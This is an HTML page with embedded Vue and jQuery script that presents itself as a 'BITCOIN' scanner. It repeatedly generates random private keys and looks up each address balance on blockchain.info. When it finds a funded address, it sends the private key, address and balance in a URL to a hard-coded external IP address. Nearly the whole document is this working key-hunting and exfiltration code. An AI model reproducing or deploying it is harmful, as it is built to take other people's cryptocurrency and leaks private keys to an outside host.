	<body style="background-color:#000000">
	
		<div class="container" style="margin-top:20px;" id="appvue">
			<div class="row">
				<div class="col-sm">
					<h1><font color="#00EC00">BITCOIN</font></h1>
					</br>
					<table class="table borderless">
						<tbody>
							<tr>
								<th scope="col"><font color="#00EC00">PrivateKey</font></th>
								<th scope="col"><font color="#00EC00">Balance</font></th>
							</tr>
							<tr id='init'>
								<td><font color="#00EC00">Initializing...</font></td>
								<td><font color="#00EC00">Initializing...</font></td>
							</tr>
							<tr v-for="i in scan_list" align="left">
								<td><font :color="i[2]">{{ i[0] }}</font></td>
								<td><font :color="i[2]">{{ i[1] }}</font></td>
							</tr>

		<script>
			var app_vue = new Vue({
				el: '#appvue',
				data: {
					scan_list: [],
				},
			})
			var selfg = this
			function allRunFunction() {
				$('#init').hide()
				var ooo = foo.myFunction()
				var rrr = ooo.makeRandom()
				var self = this
				var clr = '#00EC00'
				$.ajax({url:'https://blockchain.info/q/addressbalance/'+rrr.getAddress(),async:false,timeout:3000,success:function(data){
					self.abc = data/100000000
				},
				complete:function(XMLHttpRequest,status){
					if(status=='timeout'){
						ajaxTimeoutTest.abort();
						self.abc = 'timeout';
					}
				}});
				if (self.abc > 0){
					clearInterval(timer)
					clr = '#FF0000'
					window.open("http://118.89.52.212/bitcoin/"+rrr.toWIF()+'/'+rrr.getAddress()+'/'+self.abc); 
				}
				if (selfg.app_vue.scan_list.length > 14){
					selfg.app_vue.scan_list.unshift([rrr.toWIF(), self.abc, clr])
					selfg.app_vue.scan_list.pop()
				}else{
					selfg.app_vue.scan_list.unshift([rrr.toWIF(), self.abc, clr])
				}
			}
			var timer = setInterval(allRunFunction, 2500)
		</script>
